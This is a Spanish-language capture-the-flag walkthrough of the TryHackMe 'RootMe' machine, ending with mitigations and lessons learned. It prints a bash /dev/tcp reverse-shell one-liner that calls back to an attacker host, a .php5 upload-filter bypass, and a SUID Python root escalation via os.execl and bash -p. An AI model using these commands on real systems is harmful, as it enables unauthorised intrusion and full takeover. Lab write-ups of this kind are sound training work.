# RootMe

**Plataforma:** TryHackMe  
**Dificultad:** Fácil  
**Categoría:** Linux / Web / File Upload / PHP / SUID / Python

## 1. Reconocimiento

### Nmap

- Lanzamos un escaneo para identificar los puertos y servicios:

```bash
nmap -sCV -Pn 10.128.166.119
```

- Encontramos:

- `22/tcp` → SSH
- `80/tcp` → HTTP

- Accedemos a la aplicación web:

```text
http://10.128.166.119
```

- Utilizamos `whatweb` para identificar tecnologías:

```bash
whatweb http://10.128.166.119
```

- No encontramos información especialmente relevante.

## 2. Enumeración

### Fuzzing web

- Utilizamos `ffuf` para descubrir directorios y archivos:

```bash
ffuf -u http://10.128.166.119/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

- Encontramos:

```text
/panel/
/uploads/
```

- Accedemos al panel:

```text
http://10.128.166.119/panel/
```

- Encontramos una funcionalidad de subida de archivos:

```text
File to upload
```

- También encontramos el directorio:

```text
/uploads/
```

- Esto es interesante porque podemos intentar subir un archivo PHP y conseguir ejecución de código en el servidor.

## 3. Explotación

### File Upload

- Primero intentamos subir un archivo PHP con una reverse shell sencilla:

```bash
echo '<?php exec("/bin/bash -c '\''bash -i >& /dev/tcp/192.168.173.148/4545 0>&1'\'')"); ?>' > file.php
```

- La aplicación rechaza el archivo:

```text
PHP não é permitido!
```

- Esto indica que existe un filtro que bloquea archivos con extensión `.php`.

### Bypass de extensión

- Probamos a cambiar la extensión:

```bash
mv file.php file.php5
```

- La aplicación permite subir el archivo `.php5`.

- También podemos utilizar la reverse shell PHP incluida en Kali:

```text
/usr/share/webshells/php/php-reverse-shell.php
```

- Modificamos la IP y el puerto de escucha dentro del archivo y lo renombramos con una extensión permitida:

```bash
mv php-reverse-shell.php php-reverse-shell.php5
```

### Reverse Shell

- En nuestra máquina nos ponemos a la escucha:

```bash
nc -lvnp 4545
```

- Subimos el archivo mediante el panel.

- Una vez subido, accedemos al archivo desde:

```text
http://10.128.166.119/uploads/php-reverse-shell.php5
```

- Al ejecutarse el archivo recibimos una reverse shell.

- Comprobamos el usuario:

```bash
whoami
```

- Obtenemos:

```text
www-data
```

### Estabilizar la shell

- Primero creamos una TTY:

```bash
script /dev/null -c bash
```

- Pulsamos:

```text
Ctrl + Z
```

- En nuestra máquina ejecutamos:

```bash
stty raw -echo
fg
```

- Después configuramos el terminal:

```bash
reset xterm
```

```bash
export TERM=xterm
```

```bash
export SHELL=bash
```

- Ahora disponemos de una terminal mucho más funcional.

### User Flag

- Comprobamos dónde estamos:

```bash
pwd
```

- Nos encontramos en el entorno de `www-data`.

- Buscamos la User Flag:

```bash
cat /var/www/user.txt
```

## 4. Escalada de privilegios

### Enumeración de sudo

- Comprobamos si `www-data` puede ejecutar comandos mediante `sudo`:

```bash
sudo -l
```

- No podemos utilizar este vector porque no tenemos contraseña.

### Enumeración de SUID

- Buscamos binarios con el bit SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

- Encontramos:

```text
/usr/bin/python2.7
```

- Lo interesante es que `python2.7` tiene el bit SUID y puede ser ejecutado por un usuario sin privilegios.

### Comprobar Python

- Probamos que podemos ejecutar Python:

```bash
/usr/bin/python2.7 -c 'print("hola")'
```

- El comando se ejecuta correctamente.

- Como Python permite importar módulos y ejecutar funciones del sistema, podemos utilizarlo para lanzar una shell.

### Explotación del SUID de Python

- Ejecutamos:

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/bash","bash","-p")'
```

- `os.execl()` reemplaza el proceso actual por `/bin/bash`.

- El argumento:

```text
-p
```

hace que Bash mantenga los privilegios efectivos del proceso.

- Como Python se está ejecutando mediante SUID con privilegios de `root`, Bash hereda esos privilegios.

La cadena es:

```text
python2.7 SUID
      ↓
ejecutado con privilegios de root
      ↓
os.execl()
      ↓
/bin/bash -p
      ↓
mantiene privilegios efectivos
      ↓
root
```

- Comprobamos:

```bash
whoami
```

- Obtenemos:

```text
root
```

- Ya tenemos privilegios máximos.

- Finalmente obtenemos la Root Flag:

```bash
cat /root/root.txt
```

## 5. Reporte

- La máquina **RootMe** expone SSH en el puerto `22` y un servidor web HTTP en el puerto `80`.
- Mediante fuzzing encontramos `/panel/` y `/uploads/`.
- El panel permite subir archivos, pero bloquea archivos con extensión `.php`.
- Probamos un bypass cambiando la extensión a `.php5`, que es aceptada por la aplicación.
- Subimos una reverse shell PHP y conseguimos una shell como `www-data`.
- Estabilizamos la terminal y obtenemos la User Flag.
- Comprobamos `sudo`, pero no podemos utilizarlo porque requiere contraseña.
- Buscando binarios SUID encontramos `/usr/bin/python2.7`.
- Al ejecutarlo podemos utilizar Python para lanzar `/bin/bash -p`.
- Debido a que Python tiene el bit SUID, el proceso se ejecuta con privilegios de su propietario y Bash mantiene esos privilegios gracias a `-p`.
- Conseguimos una shell como `root` y obtenemos la Root Flag.

### Cadena de ataque

```text
Nmap
 ↓
HTTP :80
 ↓
Fuzzing
 ↓
/panel/
 ↓
File Upload
 ↓
Filtro .php
 ↓
Bypass con .php5
 ↓
PHP Reverse Shell
 ↓
www-data
 ↓
User Flag
 ↓
SUID
 ↓
python2.7
 ↓
os.execl()
 ↓
/bin/bash -p
 ↓
root
 ↓
Root Flag
```

### Vulnerabilidades encontradas

| Vulnerabilidad | Severidad | Impacto |
|---|---|---|
| File Upload con bypass de extensión | Alta | Permite subir y ejecutar código |
| Python 2.7 con SUID | Crítica | Permite escalar privilegios a root |

### Mitigaciones

- Validar el tipo real del archivo subido y no únicamente su extensión.
- No permitir la ejecución de scripts en el directorio de uploads.
- Aplicar una whitelist estricta de extensiones y MIME types.
- Eliminar el bit SUID de intérpretes como Python cuando no sea estrictamente necesario.
- Mantener el sistema y sus paquetes actualizados.
- Aplicar el principio de mínimo privilegio.

## 🧠 Lessons Learned

- Un filtro que únicamente bloquea `.php` puede ser insuficiente si el servidor sigue interpretando otras extensiones PHP.
- Los directorios de uploads nunca deberían permitir la ejecución de código subido por usuarios.
- `find / -perm -4000 -type f 2>/dev/null` es una comprobación básica para localizar binarios SUID.
- Los intérpretes como Python son especialmente peligrosos cuando tienen SUID.
- `os.execl()` permite reemplazar el proceso actual por otro ejecutable.
- `/bin/bash -p` permite mantener los privilegios efectivos del proceso cuando se dispone de un contexto SUID adecuado.
- Un único binario SUID mal configurado puede convertir una cuenta como `www-data` en `root`.
